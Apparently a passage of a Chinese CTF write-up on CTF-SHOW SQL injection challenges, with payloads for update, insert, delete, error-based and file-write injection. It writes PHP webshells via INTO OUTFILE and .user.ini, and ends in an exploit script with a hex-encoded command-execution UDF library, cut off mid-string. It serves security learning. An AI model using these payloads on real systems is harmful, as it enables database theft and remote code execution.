<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">update ctfshow_user set pass = &#x27;\&#x27; where username = &#x27;, pass=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database());<br># innodb_index_stats表不知道为啥没法用where #flag23a1<br>哦也可以这么写<br>-- 查询所有新增数据库<br>select group_concat(distinct database_name) from mysql.innodb_index_stats;<br>-- 查询当前数据库中的所有表名<br>select group_concat(distinct table_name) from mysql.innodb_index_stats where database_name=schema();<br></code></pre></td></tr></table></figure>
<p>对于字段无法这么弄，采用<strong>无列名注入</strong></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">https://zhuanlan.zhihu.com/p/98206699</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-- 先猜出字段数<br>select 1,2,3 union select * from admin;<br>-- 我们的列名被替换为了对应的数字，也就是可以去用数字来查我们想知道的列值<br>select `3` from (select 1,2,3 union select * from admin)a;<br>-- 或者在引号被过滤的情况下采用别名的方式<br>select b from (select 1,2,3 as b union select * from admin)a;<br>-- 多列同时查<br>select concat(`2`,0x7e,`3`) from (select 1,2,3 union select * from admin)a;<br></code></pre></td></tr></table></figure>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">password=\&amp;username=, pass=(select group_concat(`2`) from(select 1,2,3 union select * from flag23a1)a)%23<br></code></pre></td></tr></table></figure>
</li>
<li><p>update注入</p>
<p>这里把flag关键字也给过滤了，但不知道为啥可以直接打</p>
</li>
<li><p>insert注入</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901145550324.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901145550324.png" alt="image-20220901145550324"></p>
</li>
</ol>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901145557375.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901145557375.png" alt="image-20220901145557375"></p>
<p>思路和select中的post注入一致，也就是闭合前面参数，注释后面的参数</p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username=whatever&#x27;, database());%23&amp;password=whatever<br>username=whatever&#x27;, (select group_concat(table_name) from information_schema.tables where table_schema=database()));%23&amp;password=whatever   #flag<br>username=whatever&#x27;, (select group_concat(column_name) from information_schema.columns where table_name=0x666c6167));%23&amp;password=whatever   # flagass23s3<br>username=whatever&#x27;, (select flagass23s3 from flag));%23&amp;password=whatever<br></code></pre></td></tr></table></figure>
<ol>
<li><p>insert注入</p>
<p>过滤了空格，直接用+替换发现不太行，可能是hackbar二次编码的缘故，该用括号子查询的方式绕过空格</p>
<p><strong>使用括号，括号是用来包围子查询的；因此任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username=whatever&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())));%23&amp;password=whatever   # flagb<br>username=whatever&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c616762)));%23&amp;password=whatever  #flag<br>username=whatever&#x27;,(select(flag)from(flagb)));%23&amp;password=whatever<br></code></pre></td></tr></table></figure>
</li>
<li><p>insert注入</p>
<p>又把or过滤了，先用innodb引擎代替差表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username=whatever&#x27;,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())));%23&amp;password=whatever   # flagbb<br></code></pre></td></tr></table></figure>
<p>本来之后是想试试无列名注入，发现好像不行。发现解是盲猜的字段名<code>flag</code>…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username=whatever&#x27;,(select(flag)from(flagbb)));%23&amp;password=whatever<br></code></pre></td></tr></table></figure>
</li>
<li><p>insert注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">过滤空格 or sys mysql<br></code></pre></td></tr></table></figure>
</li>
</ol>
<p>Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写</p>
<p>也就是说前面表我们是查不了了，只能自己爆破出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">username=whatever&#x27;,(select(flag)from(flag&#123;爆破点&#125;)));%23&amp;password=whatever<br></code></pre></td></tr></table></figure>
<p>哦哦其实就是自己把所有的可能全部试一遍，然后正确的肯定在里头，也就会把flag显示出来</p>
<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://ebc292e9-b356-434a-b046-ec9c85cfb099.challenge.ctf.show/api/insert.php&quot;</span><br><span class="hljs-comment"># username=whatever&#x27;,(select(flag)from(flag&#123;爆破点&#125;)));%23&amp;password=whatever</span><br><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ab&quot;</span>:<br>    <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ab&quot;</span>:<br>        <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ab&quot;</span>:<br>            <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ab&quot;</span>:<br>                <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;ab&quot;</span>:<br>                    test = <span class="hljs-string">&quot;flag&quot;</span> + a + b + c + d + e<br>                    data = &#123;<br>                        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">f&quot;whatever&#x27;,(select(flag)from(<span class="hljs-subst">&#123;test&#125;</span>)));#&quot;</span>,<br>                        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;whatever&quot;</span><br>                    &#125;<br>                    r = requests.post(url, data=data)<br></code></pre></td></tr></table></figure>
<ol>
<li><p>delete注入</p>
<p>参数点为post传参，名字为id</p>
</li>
</ol>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901171714517.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901171714517.png" alt="image-20220901171714517"></p>
<p>sql语句，没有过滤</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901171756099.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220901171756099.png" alt="image-20220901171756099" style="zoom:50%;"></p>
<p>没有回显点，考虑时间盲注，注意的是时间开销上是所有记录之和</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">delete from ctfshow_user where id = if(1=1, sleep(0.03), 1)<br></code></pre></td></tr></table></figure>
<ol>
<li><p>file注入</p>
<p>题面给出了一个写文件操作，filename可控</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902164638250.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902164638250.png" alt="image-20220902164638250"></p>
<p>POST传参，参数为filename</p>
</li>
</ol>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902164825092.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902164825092.png" alt="image-20220902164825092" style="zoom:50%;"></p>
<p>这里利用到了<code>into outfile</code>后面的一些其他输出参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT ... INTO OUTFILE &#x27;file_name&#x27;<br>        [CHARACTER SET charset_name]<br>        [export_options]<br><br>export_options:<br>    [&#123;FIELDS | COLUMNS&#125;<br>        [TERMINATED BY &#x27;string&#x27;]//分隔符<br>        [[OPTIONALLY] ENCLOSED BY &#x27;char&#x27;]<br>        [ESCAPED BY &#x27;char&#x27;]<br>    ]<br>    [LINES<br>        [STARTING BY &#x27;string&#x27;]<br>        [TERMINATED BY &#x27;string&#x27;]<br>    ]<br>----------------------------------------------------<br>“OPTION”参数为可选参数选项，其可能的取值有：<br><br>`FIELDS TERMINATED BY &#x27;字符串&#x27;`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。<br><br>`FIELDS ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。<br><br>`FIELDS OPTIONALLY ENCLOSED BY &#x27;字符&#x27;`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。<br><br>`FIELDS ESCAPED BY &#x27;字符&#x27;`：设置转义字符，只能为单个字符。默认值为“\”。<br><br>`LINES STARTING BY &#x27;字符串&#x27;`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。<br><br>`LINES TERMINATED BY &#x27;字符串&#x27;`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。<br></code></pre></td></tr></table></figure>
<p>最后两个参数的作用可以让我们在写入文件中挂马</p>
<p><strong>payload：</strong> 注意双引号好像被转义了，之后蚁剑去连接就行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">filename=1.php&#x27; LINES STARTING BY &#x27;&lt;?php @eval($_POST[1]); ?&gt;&#x27;#<br></code></pre></td></tr></table></figure>
<ol>
<li><p>file注入</p>
<p>这题过滤了php关键字，本来以为试试用phtml。但是wp看着这题的考点是上传配置文件user.ini。。。结合了文件上传</p>
<p>在/var/www/html/dump目录下存在一个index.php文件，所以在同目录下我们可以去通过上传.user.ini配置文件，来实现文件包含的功能。将恶意代码包含到index.php中</p>
<p>这里比较坑的是要保证配置项<strong>单独占一行</strong>，所以还要加上换行符</p>
<p>不然会出现这种情况</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902172059797.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902172059797.png" alt="image-20220902172059797"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">filename=.user.ini&#x27;  lines starting by &#x27;auto_prepend_file = 1.txt\n&#x27;%23 #包含文件<br># 写马的话就写简化版的<br>filename=1.txt&#x27; LINES STARTING BY &#x27;&lt;?= eval($_POST[1])?&gt;&#x27;%23 #注入马<br></code></pre></td></tr></table></figure>
</li>
<li><p>报错注入</p>
<p>题面，无过滤，单引号闭合</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902195304990.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902195304990.png" alt="image-20220902195304990" style="zoom:50%;"></p>
<p>参数点为id，注入检测时发现报错回显，可以利用报错注入</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902195411798.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902195411798.png" alt="image-20220902195411798"></p>
</li>
</ol>
<p><strong>exp:</strong>  需要注意的是由于此报错注入和<code>updatexml</code>都只能<strong>爆最大32位</strong>，如果要爆出32位之后的数据，需要借助<code>mid</code>或者<code>substr</code>等切割函数进行字符截取从而显示32位以后的数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">id=1&#x27; and extractvalue(1, concat(0x23, (select version()))) %23<br>id=1&#x27; and extractvalue(1, concat(0x23, (select group_concat(table_name) from information_schema.tables where table_schema=database()))) %23   # ctfshow_flag<br>id=1&#x27; and extractvalue(1, concat(0x23, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flag&#x27;))) %23    #flag<br>id=1&#x27; and extractvalue(1, concat(0x23, substr((select group_concat(flag) from ctfshow_flag),xx,xx))) %23<br></code></pre></td></tr></table></figure>
<ol>
<li><p>报错注入</p>
<p>过滤了updatexml，上面的继续打</p>
</li>
<li><p>报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">过滤updatexml extractvalue<br></code></pre></td></tr></table></figure>
</li>
</ol>
<p>这里学一个floor报错注入，floor注入有个特点是没法用<strong>group_concat</strong>了，应该是外面还套了个concat的缘故，所以该用limit慢慢注出来</p>
<p><strong>exp：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT COUNT(*),floor(RAND(0)*2) as x from users GROUP BY x<br>1&#x27; and (select 1 from (select count(*), concat(0x7e, database(), 0x7e, floor(rand(0)*2)) as x from ctfshow_user group by x ) as y)%23 <br>id=1&#x27; and (select 1 from (select count(*), concat(0x7e, (select table_name from information_schema.tables where table_schema=database() limit 1,1), 0x7e, floor(rand(0)*2)) as x from ctfshow_user group by x ) as y)%23  # ctfshow_flags<br>id=1&#x27; and (select 1 from (select count(*), concat(0x7e, (select column_name from information_schema.columns where table_name=&#x27;ctfshow_flags&#x27; limit 1,1), 0x7e, floor(rand(0)*2)) as x from ctfshow_user group by x ) as y)%23  # flag2<br>id=1&#x27; and (select 1 from (select count(*), concat(0x7e, (select flag2 from ctfshow_flags limit 0,1), 0x7e, floor(rand(0)*2)) as x from ctfshow_user group by x ) as y)%23<br></code></pre></td></tr></table></figure>
<ol>
<li><p>报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">过滤updatexml extractvalue floor<br></code></pre></td></tr></table></figure>
</li>
</ol>
<p>其实还是可以继续基于floor的原理，找一个可以实现类似功能的函数即可。floor与rand搭配是用于能产生固定的序列</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902203422524.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902203422524.png" alt="image-20220902203422524" style="zoom:50%;"></p>
<p>floor本身用于向下取整，小数部分舍弃。试试round或者ceil。也没有问题</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902203730588.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220902203730588.png" alt="image-20220902203730588" style="zoom:50%;"></p>
<p>把上一关的payload关键词改成ceil即可</p>
<p>ctfshow_flagsa flag? 注意这里的字段名<code>flag?</code>里面的<code>?</code>为保留字符，所以需要包在反引号当中作为区分</p>
<ol>
<li><p>UDF注入</p>
<p>先把sqlmap自带的可以执行命令的UDF文件进行解码</p>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904000411089.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904000411089.png" alt="image-20220904000411089" style="zoom:50%;"></p>
<p>其次便是要将这个文件放到目标机器的plugin目录下。如何查找该目录？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show variables like &#x27;%plugin%&#x27;;<br># 或者<br>select @@plugin_dir<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904000757048.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904000757048.png" alt="image-20220904000757048" style="zoom:50%;"></p>
<p>查询方式：利用<strong>堆叠注入</strong></p>
<p><strong>payload:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=&#x27;;show variables like &#x27;%plugin%&#x27;; %23<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904001223713.png'><img src="/2022/09/08/CTF-SHOW%20SQL%20%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220904001223713.png" alt="image-20220904001223713" style="zoom:50%;"></p>
</li>
</ol>
<p>查到plugin路径为：<code>/usr/lib/mariadb/plugin</code></p>
<p>后面便是将文件写入进去，最后执行文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select unhex(...) into dumpfile &quot;/usr/lib/mysql/plugin/lib_mysqludf_sys.so&quot;<br>-- 引用共享库文件创建存储过程<br>create function sys_eval returns string soname &quot;lib_mysqludf_sys.so&quot;;<br>select sys_eval(&quot;whoami&quot;);<br>drop function sys_eval; # 清除<br></code></pre></td></tr></table></figure>
<p>create function格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">CREATE FUNCTION &lt;函数名&gt; ( [ &lt;参数1&gt; &lt;类型1&gt; [ , &lt;参数2&gt; &lt;类型2&gt;] ] … )<br>  RETURNS &lt;类型&gt;<br>  &lt;函数主体&gt;<br></code></pre></td></tr></table></figure>
<p>因为不太会写所以看了wp。这里有个细节就是文件大小问题，因为可能一次写入的长度有限制，所以wp选择了将udf文件分成5次写入到目标机器的txt文件中。最后再读出并且合并写入最终的so文件当中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=gbk</span><br><br><span class="hljs-keyword">import</span> requests<br><br>base_url = <span class="hljs-string">&quot;http://419365ab-bd53-41c5-8ee6-cfce555b8be5.challenge.ctf.show/api/&quot;</span><br><br>udf_inhex = <span class="hljs-string">&quot;7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846FEFFFF488B45E048C7001E000000488B45E8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F801751C488B45F0488B40088B0085C0750E488B45F8C60001B800000000EB20488D0D83050000488B45E8BA2B0000004889CE4889C7E8DFFDFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC4048897DE8488975E0488955D848894DD04C8945C84C894DC0488B45E0488B4010488B004889C7E8BBFDFFFF488945F848837DF8007509488B45C8C60001EB16488B45F84889C7E84BFDFFFF4889C2488B45D0488910488B45F8C9C3554889E54883EC2048897DF8488975F0488955E8488B45F08B0083F8027425488D0D05050000488B45E8BA1F0000004889CE4889C7E831FDFFFFB801000000E9AB000000488B45F0488B40088B0085C07422488D0DF2040000488B45E8BA280000004889CE4889C7E8FEFCFFFFB801000000EB7B488B45F0488B40084883C004C70000000000488B45F0488B4018488B10488B45F0488B40184883C008488B00488D04024883C0024889C7E84BFCFFFF4889C2488B45F848895010488B45F8488B40104885C07522488D0DA4040000488B45E8BA1A0000004889CE4889C7E888FCFFFFB801000000EB05B800000000C9C3554889E54883EC1048897DF8488B45F8488B40104885C07410488B45F8488B40104889C7E811FCFFFFC9C3554889E54883EC3048897DE8488975E0488955D848894DD0488B45E8488B4010488945F0488B45E0488B4018488B004883C001480345F0488945F8488B45E0488B4018488B10488B45E0488B4010488B08488B45F04889CE4889C7E8EFFBFFFF488B45E0488B4018488B00480345F0C60000488B45E0488B40184883C008488B10488B45E0488B40104883C008488B08488B45F84889CE4889C7E8B0FBFFFF488B45E0488B40184883C008488B00480345F8C60000488B4DF8488B45F0BA010000004889CE4889C7E892FBFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0DC2020000488B45D8BA2B0000004889CE4889C7E81EFBFFFFB801000000C9C3554889E548897DF8C9C3554889E54883EC2048897DF8488975F0488955E848894DE0488B45F0488B4010488B004889C7E882FAFFFF4898C9C3554889E54883EC3048897DE8488975E0488955D8C745FC00000000488B45E08B0083F801751F488B45E0488B40088B55FC48C1E2024801D08B0085C07507B800000000EB20488D0D22020000488B45D8